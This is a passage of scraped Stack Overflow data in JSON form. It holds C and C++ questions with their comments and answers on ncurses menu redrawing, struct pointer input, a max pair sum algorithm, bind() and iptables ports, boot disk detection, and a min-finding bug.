*/\n  WINDOW        *usersub;               /* User's subwindow                */\n</code></pre>\n\n<p>but making that work requires some study of the library.  There's an example which resizes a <em>form</em> in <a href=\"http://invisible-island.net/ncurses/ncurses-examples.html\" rel=\"nofollow\">ncurses-examples</a> (named <code>cardfile</code>), but no analogous example for <em>menus</em>.</p>\n\n<p>Further reading:</p>\n\n<ul>\n<li><a href=\"http://invisible-island.net/ncurses/man/wresize.3x.html\" rel=\"nofollow\"><code>wresize</code> - resize a curses window</a></li>\n<li><a href=\"http://invisible-island.net/ncurses/man/resizeterm.3x.html\" rel=\"nofollow\"><code>is_term_resized</code>,  <code>resize_term</code>,  <code>resizeterm</code>  -  change  the\n   curses terminal size</a></li>\n</ul>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user253667"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 814, "favorite_count": 0, "accepted_answer_id": 35904474, "answer_count": 1, "score": 0, "last_activity_date": 1457564827, "creation_date": 1457544266, "question_id": 35898431, "link": "https://stackoverflow.com/questions/35898431/how-to-redraw-an-ncurses-menu", "title": "How to redraw an ncurses menu", "body": "<p>I am working on an ncurses-based tool that has 4 tiled windows with a command bar at the bottom of the screen.  The windows form a 2x2 grid like this:</p>\n\n<pre><code>+----+----------------+\n| 1  |  2             |\n+----+----------------+\n| 3  |  4             |\n|    |                |\n|    |                |\n|    |                |\n+----+----------------+\n</code></pre>\n\n<p>The top left is fixed in size, so when the app is resized, 2 changes in width, 3 changes in height, and 4 changes in both directions.</p>\n\n<p>I had the redrawing code working fine until I started putting menus (using menu.h) in window 4.  Now, if i resize the window too small, part of the menu will get cut off, but when you make the window bigger again, it does not repaint what was removed.  Doing a post_menu() in the redraw code does not repaint it.</p>\n\n<p>What is the proper way to repaint a menu?  Do I have to dispose of it and recreate it from scratch every time?  I do have logic in my code that only repaints if necessary (data changed, window resized, etc), so it would not be creating a new menu every cycle for no reason, but this still seems a bit heavy handed.  There has to be a simple way to just redraw the menu you have already created.  What is it?</p>\n"}, {"tags": ["c", "pointers", "structure"], "comments": [{"owner": {"reputation": 67504, "user_id": 1230836, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/38PFC.jpg?s=128&g=1", "display_name": "Elias Van Ootegem", "link": "https://stackoverflow.com/users/1230836/elias-van-ootegem"}, "edited": false, "score": 1, "creation_date": 1457544900, "post_id": 35898299, "comment_id": 59457790, "body": "You haven&#39;t compiled and run this code have you. You&#39;re dereferencing a null pointer: <code>emp</code> is initialized to NULL (static storage), and it&#39;s a pointer. You&#39;re not allocating the memory for the struct anywhere, so <code>(*record)-&gt;id</code> is like writing <code>(NULL)-&gt;id</code>, which is of course wrong"}, {"owner": {"reputation": 29, "user_id": 2231797, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/978d07b2ff3ed0112fbc7bece279ebe6?s=128&d=identicon&r=PG", "display_name": "Chiranjibi Adhikari", "link": "https://stackoverflow.com/users/2231797/chiranjibi-adhikari"}, "reply_to_user": {"reputation": 67504, "user_id": 1230836, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/38PFC.jpg?s=128&g=1", "display_name": "Elias Van Ootegem", "link": "https://stackoverflow.com/users/1230836/elias-van-ootegem"}, "edited": false, "score": 0, "creation_date": 1457571046, "post_id": 35898299, "comment_id": 59471489, "body": "I have compiled and there&#39;s shows nothing wrong with code. whenever i try to take input it stop working and exit the program."}], "answers": [{"comments": [{"owner": {"reputation": 67504, "user_id": 1230836, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/38PFC.jpg?s=128&g=1", "display_name": "Elias Van Ootegem", "link": "https://stackoverflow.com/users/1230836/elias-van-ootegem"}, "edited": false, "score": 1, "creation_date": 1457545076, "post_id": 35898522, "comment_id": 59457897, "body": "<b><i>Don&#39;t</i></b> cast the return value of <code>malloc</code>. Also: <code>sizeof(char)</code> is guaranteed to be 1, no point in adding that. The preferred way to allocate memory is: <code>some_ptr = malloc(N * sizeof *some_ptr);</code> Because it does what it&#39;s supposed to, always: <code>malloc</code> N times the size of the the type <code>some_ptr</code> points to. <code>some_ptr</code> can change type, the <code>malloc</code> call will still work. regardless of the levels of indirection you&#39;re dealing with, using the <code>sizeof *destination_ptr</code> will <i>always</i> work"}, {"owner": {"reputation": 1477, "user_id": 5134525, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/7f673da25919bd95349b3645cfca5167?s=128&d=identicon&r=PG", "display_name": "Sharad", "link": "https://stackoverflow.com/users/5134525/sharad"}, "reply_to_user": {"reputation": 67504, "user_id": 1230836, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/38PFC.jpg?s=128&g=1", "display_name": "Elias Van Ootegem", "link": "https://stackoverflow.com/users/1230836/elias-van-ootegem"}, "edited": false, "score": 0, "creation_date": 1457545567, "post_id": 35898522, "comment_id": 59458206, "body": "Thanks. I&#39;ll make the correction. That&#39;s a very beneficial advice"}, {"owner": {"reputation": 29, "user_id": 2231797, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/978d07b2ff3ed0112fbc7bece279ebe6?s=128&d=identicon&r=PG", "display_name": "Chiranjibi Adhikari", "link": "https://stackoverflow.com/users/2231797/chiranjibi-adhikari"}, "edited": false, "score": 0, "creation_date": 1457572205, "post_id": 35898522, "comment_id": 59471808, "body": "Thanks sharad and elias. It was all about memory allocation to structure pointer. what is good code to get input as  <b>scanf(&quot;%d&quot;,(*record)-&gt;id)</b> , <b>scanf(&quot;%d&quot;,&amp;record-&gt;id)</b> and <b>scanf(&quot;%d&quot;,record-&gt;id)</b> works all fine."}, {"owner": {"reputation": 1477, "user_id": 5134525, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/7f673da25919bd95349b3645cfca5167?s=128&d=identicon&r=PG", "display_name": "Sharad", "link": "https://stackoverflow.com/users/5134525/sharad"}, "edited": false, "score": 0, "creation_date": 1457583715, "post_id": 35898522, "comment_id": 59474987, "body": "If you are using single pointer then scanf(&quot;%d&quot;,&amp;record-&gt;id) is correct"}], "tags": [], "owner": {"reputation": 1477, "user_id": 5134525, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/7f673da25919bd95349b3645cfca5167?s=128&d=identicon&r=PG", "display_name": "Sharad", "link": "https://stackoverflow.com/users/5134525/sharad"}, "is_accepted": true, "score": 1, "last_activity_date": 1457545675, "last_edit_date": 1457545675, "creation_date": 1457544492, "answer_id": 35898522, "question_id": 35898299, "link": "https://stackoverflow.com/questions/35898299/how-to-input-value-from-user-using-structure-pointer-and-display-the-value-of-st/35898522#35898522", "title": "How to input value from user using structure pointer and display the value of structure members?", "body": "<p>A double pointer is not needed. You can accomplish this with single pointer as well. You would however need to allocate memory for the structure before populating it. </p>\n\n<p><code>struct employee *emp = malloc(sizeof(struct employee));</code></p>\n\n<p>Also the size of <code>char addr[]</code> in your structure is undefined. That needs to be allocated separately similar to:</p>\n\n<p><code>emp-&gt;addr = malloc(N*sizeof(*emp-&gt;addr));</code></p>\n\n<p>All other fields in the structure which has a fixed size such as integer,float and a character array of 20 elements does not need allocation. The allocation for them would be done by malloc we did earlier. However since <code>addr</code> is a pointer, memory equivalent to size of pointer would be reserved for it. To store anything in the address the <code>addr</code> points to, we need to allocate.</p>\n\n<p>Afterwards pass emp to your function. Remove the double pointer</p>\n"}], "owner": {"reputation": 29, "user_id": 2231797, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/978d07b2ff3ed0112fbc7bece279ebe6?s=128&d=identicon&r=PG", "display_name": "Chiranjibi Adhikari", "link": "https://stackoverflow.com/users/2231797/chiranjibi-adhikari"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 852, "favorite_count": 0, "accepted_answer_id": 35898522, "answer_count": 1, "score": 0, "last_activity_date": 1457545675, "creation_date": 1457543951, "question_id": 35898299, "link": "https://stackoverflow.com/questions/35898299/how-to-input-value-from-user-using-structure-pointer-and-display-the-value-of-st", "title": "How to input value from user using structure pointer and display the value of structure members?", "body": "<pre><code>#include&lt;stdio.h&gt;\n#include&lt;string.h&gt;\n\nstruct employee\n{\n   int id;\n   char name[20];\n   float salary;\n   char addr[];   \n}*emp;\n\nvoid get_emp(struct employee **record)\n{\n\n   printf(\"\\tplease enter details of employee:\\n\");\n\n   printf(\"id= \");\n    scanf(\"%d\",(*record)-&gt;id);//code to get input value\n\n   printf(\"Name= \");\n   scanf(\" %s\",(*record)-&gt;name);\n\n   printf(\"salary= \");\n   scanf(\"%f\",(*record)-&gt;salary);\n\n\n}\n\nint main()\n{\nget_emp(&amp;emp);\nprintf(\"id=%d\\n\",emp-&gt;id); // code to display the value\nprintf(\"Name=%s\\n\",emp-&gt;name);\nprintf(\"salary=%f\\n\",emp-&gt;salary);\n\n\nreturn 0;\n}\n</code></pre>\n\n<p>I have a structure example and I want to pass structure pointer to the function without using normal variable but only pointer. Is the parameter(double pointer) in the function <strong>get_emp(struct employee **record)</strong> a correct way to do if not what changes should be made? Also how to get input value from users in the function <strong>get_emp(struct employee **record)</strong> and how to display the value?</p>\n"}, {"tags": ["c", "arrays", "algorithm", "performance"], "comments": [{"owner": {"reputation": 1441, "user_id": 1242040, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/78efdb88b9c7d15703c8971aab3e185e?s=128&d=identicon&r=PG", "display_name": "frodo", "link": "https://stackoverflow.com/users/1242040/frodo"}, "edited": false, "score": 0, "creation_date": 1457544328, "post_id": 35898157, "comment_id": 59457374, "body": "Is the array sorted?"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1457544370, "post_id": 35898157, "comment_id": 59457398, "body": "<code>int max_sum;</code> --&gt; <code>int max_sum = INT_MIN;</code> because you use an <i>uninitialised variable</i>."}, {"owner": {"reputation": 561, "user_id": 4108929, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/34ce934551dd49eeebb4a47f7b57d9a1?s=128&d=identicon&r=PG&f=1", "display_name": "Mitsos101", "link": "https://stackoverflow.com/users/4108929/mitsos101"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1457544677, "post_id": 35898157, "comment_id": 59457636, "body": "@WeatherVane Oops, my mistake, it&#39;s 0."}, {"owner": {"reputation": 14477, "user_id": 2505965, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5056f8ef1dc81df419a479f24d5f80f5?s=128&d=identicon&r=PG", "display_name": "Oka", "link": "https://stackoverflow.com/users/2505965/oka"}, "edited": false, "score": 3, "creation_date": 1457544733, "post_id": 35898157, "comment_id": 59457683, "body": "@Mitsos101 Edge case alert! The largest sum of two numbers, in a set of numbers, <i>could</i> be negative."}, {"owner": {"reputation": 561, "user_id": 4108929, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/34ce934551dd49eeebb4a47f7b57d9a1?s=128&d=identicon&r=PG&f=1", "display_name": "Mitsos101", "link": "https://stackoverflow.com/users/4108929/mitsos101"}, "reply_to_user": {"reputation": 14477, "user_id": 2505965, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5056f8ef1dc81df419a479f24d5f80f5?s=128&d=identicon&r=PG", "display_name": "Oka", "link": "https://stackoverflow.com/users/2505965/oka"}, "edited": false, "score": 1, "creation_date": 1457544805, "post_id": 35898157, "comment_id": 59457727, "body": "@Oka My fault again, the integers are always positive."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 2, "creation_date": 1457545938, "post_id": 35898157, "comment_id": 59458475, "body": "Then why are they not <code>unsigned</code>?"}], "answers": [{"tags": [], "owner": {"reputation": 47569, "user_id": 3255455, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5993e7ece129141878cd6419d39cc26e?s=128&d=identicon&r=PG&f=1", "display_name": "gnasher729", "link": "https://stackoverflow.com/users/3255455/gnasher729"}, "is_accepted": false, "score": 10, "last_activity_date": 1553049960, "last_edit_date": 1553049960, "creation_date": 1457545512, "answer_id": 35898859, "question_id": 35898157, "link": "https://stackoverflow.com/questions/35898157/find-largest-pair-sum-in-array-of-integers/35898859#35898859", "title": "Find largest pair sum in array of integers", "body": "<p>It's quite simple to do in O (n), not O (n\u00b2) like your solution. </p>\n\n<pre><code>For each j, 0 \u2264 j &lt; n, \ncalculate m [j] = \"largest element from a [j] to a [n - 1]. \". \nObviously m [n - 1] = a [n - 1], m [j] = max (a [j], m [j + 1]). \n\nThen for each i, 0 \u2264 i &lt; n - k, calculate a [i] + m [i + k], \nand pick the largest of these. \n</code></pre>\n\n<p>It should be obvious how to do this without actually storing the values <code>m [j]</code> except for one. </p>\n"}, {"comments": [{"owner": {"reputation": 561, "user_id": 4108929, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/34ce934551dd49eeebb4a47f7b57d9a1?s=128&d=identicon&r=PG&f=1", "display_name": "Mitsos101", "link": "https://stackoverflow.com/users/4108929/mitsos101"}, "edited": false, "score": 0, "creation_date": 1457546985, "post_id": 35899107, "comment_id": 59459114, "body": "Shouldn&#39;t it be n&gt;=k?"}], "tags": [], "owner": {"reputation": 36328, "user_id": 5483526, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ec50563f80bacd2a7fed69bd31d0c810?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Timmermans", "link": "https://stackoverflow.com/users/5483526/matt-timmermans"}, "is_accepted": false, "score": 4, "last_activity_date": 1457546738, "last_edit_date": 1457546738, "creation_date": 1457546366, "answer_id": 35899107, "question_id": 35898157, "link": "https://stackoverflow.com/questions/35898157/find-largest-pair-sum-in-array-of-integers/35899107#35899107", "title": "Find largest pair sum in array of integers", "body": "<pre><code>//assuming we checked first for n&lt;=k\nint max_lagged = arr_sums[0];\nint max_sum = max_lagged+arr_sums[k];\nint sum;\nfor (int i = k+1 ; i &lt; n; i++) {\n    if (arr_sums[i-k] &gt; max_lagged) {\n        max_lagged=arr_sums[i-k];\n    }\n    sum = arr_sums[i] + max_lagged;\n    if ( sum &gt; max_sum ) {\n        max_sum = sum;\n    }\n}\n</code></pre>\n"}], "owner": {"reputation": 561, "user_id": 4108929, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/34ce934551dd49eeebb4a47f7b57d9a1?s=128&d=identicon&r=PG&f=1", "display_name": "Mitsos101", "link": "https://stackoverflow.com/users/4108929/mitsos101"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1921, "favorite_count": 0, "answer_count": 2, "score": 5, "last_activity_date": 1553049960, "creation_date": 1457543516, "last_edit_date": 1457545617, "question_id": 35898157, "link": "https://stackoverflow.com/questions/35898157/find-largest-pair-sum-in-array-of-integers", "title": "Find largest pair sum in array of integers", "body": "<p>How can I find the largest pair sum in an array of positive integers of size n, but with the integers at least at a distance k? (For example, if the first element is a[i], then the second element should be a[i+k] (or more).)</p>\n\n<p>I tried this: </p>\n\n<pre><code>int max_sum = 0;\nint sum;\nfor (int i = 0 ; i &lt; n; i++) {\n    for( int j = i + k; j &lt; n; j++) {\n        sum = arr_sums[i] + arr_sums[j];\n        if ( sum &gt; max_sum ) {\n            max_sum = sum;\n\n        }\n    }\n}\n</code></pre>\n\n<p>but it's too slow for large arrays.</p>\n"}, {"tags": ["c++", "c", "linux", "sockets", "bind"], "comments": [{"owner": {"reputation": 339644, "user_id": 118068, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/077db5466d3b58e7bbbd498dca173f04?s=128&d=identicon&r=PG", "display_name": "Marc B", "link": "https://stackoverflow.com/users/118068/marc-b"}, "edited": false, "score": 0, "creation_date": 1457543538, "post_id": 35898079, "comment_id": 59456803, "body": "forwarding exists independently of binding. if no process has bound to a port, then that port is available for binding, even if any traffic to/from that port has been forwarded elsewhere."}, {"owner": {"reputation": 35623, "user_id": 1003575, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/cceded39fb12d936211b56afc86dcb04?s=128&d=identicon&r=PG&f=1", "display_name": "MOHAMED", "link": "https://stackoverflow.com/users/1003575/mohamed"}, "reply_to_user": {"reputation": 339644, "user_id": 118068, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/077db5466d3b58e7bbbd498dca173f04?s=128&d=identicon&r=PG", "display_name": "Marc B", "link": "https://stackoverflow.com/users/118068/marc-b"}, "edited": false, "score": 0, "creation_date": 1457543633, "post_id": 35898079, "comment_id": 59456879, "body": "@MarcB Are there a way to find out all the port used in the iptables forwarding with C?"}, {"owner": {"reputation": 339644, "user_id": 118068, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/077db5466d3b58e7bbbd498dca173f04?s=128&d=identicon&r=PG", "display_name": "Marc B", "link": "https://stackoverflow.com/users/118068/marc-b"}, "edited": false, "score": 0, "creation_date": 1457543665, "post_id": 35898079, "comment_id": 59456904, "body": "iptables has to be able to read out its own internal rules table, so probably there is an api/interface to get that kind of data, somewhere."}], "answers": [{"tags": [], "owner": {"reputation": 2798, "user_id": 4478544, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/uPFEK.png?s=128&g=1", "display_name": "Zaboj Campula", "link": "https://stackoverflow.com/users/4478544/zaboj-campula"}, "is_accepted": false, "score": 0, "last_activity_date": 1457682364, "creation_date": 1457682364, "answer_id": 35934832, "question_id": 35898079, "link": "https://stackoverflow.com/questions/35898079/could-bind-take-a-port-that-was-configured-in-iptables-as-forwarding-port/35934832#35934832", "title": "Could bind() take a port that was configured in IPTABLES as forwarding port", "body": "<p><code>bind()</code> returns ok and it does not check any firewall rules. There are several good reasons that <code>bind()</code> ignores firewall rules.</p>\n\n<ul>\n<li>The <code>bind()</code> is much older than iptables and it is a POSIX compliant call. Checking iptables could break backward compatibility.</li>\n<li>Iptables rules might be quite complex and it is difficult to decide whether the <code>bind()</code> has a meaning. There could be complex mangling rules, rules assigned to various physical and logical interfaces...</li>\n<li>Even if one can be sure that the <code>bind()</code> to a specific port has no meaning no, rules may change in near future and the bound port may become useful.</li>\n<li>...</li>\n</ul>\n\n<p>Well it is possible to read iptables rules via C interface like <code>libiptc</code> but it is not recommended:</p>\n\n<blockquote>\n  <p>As has been pointed out numerous times on the mailinglist(s), libiptc\n  was <em>NEVER</em> meant to be used as a public interface. We don't guarantee\n  a stable interface, and it is planned to remove it in the next\n  incarnation of linux packet filtering. libiptc is way too low-layer to\n  be used reasonably anyway.</p>\n  \n  <p>We are well aware that there is a fundamental lack for such an API,\n  and we are working on improving that situation. Until then, it is\n  recommended to either use system() or open a pipe into stdin of\n  iptables-restore. The latter will give you a way better performance.</p>\n</blockquote>\n"}], "owner": {"reputation": 35623, "user_id": 1003575, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/cceded39fb12d936211b56afc86dcb04?s=128&d=identicon&r=PG&f=1", "display_name": "MOHAMED", "link": "https://stackoverflow.com/users/1003575/mohamed"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 129, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1457682364, "creation_date": 1457543310, "last_edit_date": 1457543883, "question_id": 35898079, "link": "https://stackoverflow.com/questions/35898079/could-bind-take-a-port-that-was-configured-in-iptables-as-forwarding-port", "title": "Could bind() take a port that was configured in IPTABLES as forwarding port", "body": "<p>I have a gateway with linux firmware based system.</p>\n\n<p>I have an <code>iptables</code> rule which allow to forward the port 8080 to a local host.</p>\n\n<p>I m developing an application for this linux gateway.\nthis application will choose a random port between 8000 and 8100. And then it will make <code>bind()</code> on this random port.</p>\n\n<p>Does <code>bind()</code> return OK if the random port is 8080. and then the application could start a listening server on the port 8080?</p>\n\n<p>I do not want to make conflict with <code>iptables</code> rules.\nSo if the <code>bind()</code> return NOK then I can retry to choose another random port and then retry the bind.</p>\n"}, {"tags": ["c++", "c", "linux"], "comments": [{"owner": {"reputation": 134, "user_id": 3196613, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a4153b66bc806e3ee8ffd00a4c6f2c7a?s=128&d=identicon&r=PG&f=1", "display_name": "pranav", "link": "https://stackoverflow.com/users/3196613/pranav"}, "edited": false, "score": 2, "creation_date": 1457544288, "post_id": 35898023, "comment_id": 59457340, "body": "Try lsblk or fdisk command"}, {"owner": {"reputation": 5565, "user_id": 5032339, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e3f89c7c930ef491ddc8b3de518ef667?s=128&d=identicon&r=PG&f=1", "display_name": "Roman", "link": "https://stackoverflow.com/users/5032339/roman"}, "edited": false, "score": 2, "creation_date": 1457545911, "post_id": 35898023, "comment_id": 59458454, "body": "Keep in mind, bootloader can sit on one disk, kernel on another, and root filesystem - on third."}], "owner": {"reputation": 491, "user_id": 415007, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/025cd40076ae0cb061d046cbe17f8b0f?s=128&d=identicon&r=PG", "display_name": "s_b", "link": "https://stackoverflow.com/users/415007/s-b"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 68, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1457555417, "creation_date": 1457543177, "last_edit_date": 1457555417, "question_id": 35898023, "link": "https://stackoverflow.com/questions/35898023/how-to-figure-out-which-block-device-the-os-linux-is-running-from", "title": "How to figure out which block device the OS (Linux) is running from", "body": "<p>I have a system that has a set of Self-encrypting drives (SEDs)  with OS (Ubuntu on one and CentOS on the another and rest blank) installed on each of them. I'm trying to write an application that allows me to 'lock/unlock' the drives using TCG security commands. So when I'm in ubuntu, I lock all the other drives; and when I am in CentOS I lock the Ubuntu OS disk. </p>\n\n<p>My problem right now is, from Ubuntu how do I figure out which disk (sda /sdb/ sdc ???) the current running kernel is sourced. It needs to be a generic logic so that the technique works for a ubuntu / ubuntu installation pair, hence just detecting the centOS partitions will not help.</p>\n\n<p>Any help will be appreciated. </p>\n"}, {"tags": ["c", "arrays", "pointers"], "comments": [{"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1457542571, "post_id": 35897759, "comment_id": 59456099, "body": "how do you know it&#39;s not compared?"}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1457542625, "post_id": 35897759, "comment_id": 59456135, "body": "input <code>5 4 3 2 1</code>....then?"}, {"owner": {"reputation": 43, "user_id": 5984446, "user_type": "registered", "accept_rate": 60, "profile_image": "https://lh4.googleusercontent.com/-45C7ALIwofM/AAAAAAAAAAI/AAAAAAAAABc/NSGMc9uwSRc/photo.jpg?sz=128", "display_name": "Saket Anand", "link": "https://stackoverflow.com/users/5984446/saket-anand"}, "reply_to_user": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1457542713, "post_id": 35897759, "comment_id": 59456204, "body": "It gives 5. After debugging , any statement inside <b>if</b> was not executing."}, {"owner": {"reputation": 7825, "user_id": 3684343, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5bee557e309dc42d91a706c70c8c0c9f?s=128&d=identicon&r=PG&f=1", "display_name": "mch", "link": "https://stackoverflow.com/users/3684343/mch"}, "edited": false, "score": 1, "creation_date": 1457542722, "post_id": 35897759, "comment_id": 59456211, "body": "You are looking for the maximum and forgot a new line in the first printf, but it works for me: <a href=\"http://ideone.com/ttZEBA\" rel=\"nofollow noreferrer\">ideone.com/ttZEBA</a>"}, {"owner": {"reputation": 43, "user_id": 5984446, "user_type": "registered", "accept_rate": 60, "profile_image": "https://lh4.googleusercontent.com/-45C7ALIwofM/AAAAAAAAAAI/AAAAAAAAABc/NSGMc9uwSRc/photo.jpg?sz=128", "display_name": "Saket Anand", "link": "https://stackoverflow.com/users/5984446/saket-anand"}, "edited": false, "score": 0, "creation_date": 1457542773, "post_id": 35897759, "comment_id": 59456246, "body": "I am looking for the minimum."}, {"owner": {"reputation": 7825, "user_id": 3684343, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5bee557e309dc42d91a706c70c8c0c9f?s=128&d=identicon&r=PG&f=1", "display_name": "mch", "link": "https://stackoverflow.com/users/3684343/mch"}, "edited": false, "score": 2, "creation_date": 1457542825, "post_id": 35897759, "comment_id": 59456289, "body": "Your <code>if</code> is wrong, if you are looking for the minimum. Your code looks for the maximum."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1457544105, "post_id": 35897759, "comment_id": 59457225, "body": "Apart from the fault shown in answer, what was wrong with doing <code>min = arr[0]</code> followed by <code>if ( min &gt; arr[i])</code>? You managed it well enough here <code>scanf(&quot;%d&quot;, &amp;arr[i])</code> without convolutions."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1457633435, "post_id": 35897759, "comment_id": 59506475, "body": "when calling any of the <code>scanf()</code> family of functions, always check the returned value (not the parameter value) to assure the operation was successful."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1457633542, "post_id": 35897759, "comment_id": 59506547, "body": "when the code wants a value from the user, the code should always prompt the user, with valid range, etc.   The posted code leaves the user staring at blank screen with a blinking cursor and no indication of what to do next."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1457634160, "post_id": 35897759, "comment_id": 59506936, "body": "the posted code contains &#39;magic&#39; numbers (4, 5).  &#39;magic&#39; numbers make the code much more difficult to understand, debug, maintain.   Suggest 1) eliminate all references to 4.  2) use a #define statement to give the magic number 5 a meaningful name, then use that meaningful name throughout the code.  Note: <code>min &lt; 5</code> is much clearer than <code>min &lt;= 4</code>."}], "answers": [{"tags": [], "owner": {"reputation": 5321, "user_id": 157726, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/PY0sR.png?s=128&g=1", "display_name": "Juan Leni", "link": "https://stackoverflow.com/users/157726/juan-leni"}, "is_accepted": true, "score": 2, "last_activity_date": 1457543087, "creation_date": 1457543087, "answer_id": 35897991, "question_id": 35897759, "link": "https://stackoverflow.com/questions/35897759/variable-comparing-with-pointer-reference-c-language/35897991#35897991", "title": "Variable Comparing With Pointer Reference, C language", "body": "<p>The code is executing, the problem is that your condition is wrong:</p>\n\n<pre><code>min=*(arr);\nfor(i=1;i&lt;=4;i++)\n{\n    if ( min &gt; *(arr+i) )   // Changed &lt; into &gt;\n    {\n        printf(\"min for %d is %d\",i,min);\n        min = *(arr+i);\n    }\n}\n</code></pre>\n\n<p>You first take the first element as your minimum. Later, for each element, you need to check if your <em>current</em> minimum is <strong>larger</strong> than the current value. If that is the case, you update.</p>\n"}], "owner": {"reputation": 43, "user_id": 5984446, "user_type": "registered", "accept_rate": 60, "profile_image": "https://lh4.googleusercontent.com/-45C7ALIwofM/AAAAAAAAAAI/AAAAAAAAABc/NSGMc9uwSRc/photo.jpg?sz=128", "display_name": "Saket Anand", "link": "https://stackoverflow.com/users/5984446/saket-anand"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 39, "favorite_count": 0, "accepted_answer_id": 35897991, "answer_count": 1, "score": 1, "last_activity_date": 1457543439, "creation_date": 1457542460, "last_edit_date": 1457543439, "question_id": 35897759, "link": "https://stackoverflow.com/questions/35897759/variable-comparing-with-pointer-reference-c-language", "title": "Variable Comparing With Pointer Reference, C language", "body": "<p>Why <code>min</code> is not compared to <code>*(arr+i)</code> ?\nIf statement in this code is not being executed</p>\n\n<pre><code>#include &lt;stdio.h&gt;\nint main()\n{\n    int i, min;\n    int arr[5];\n    for (i = 0; i &lt;= 4; i++)\n        scanf(\"%d\", 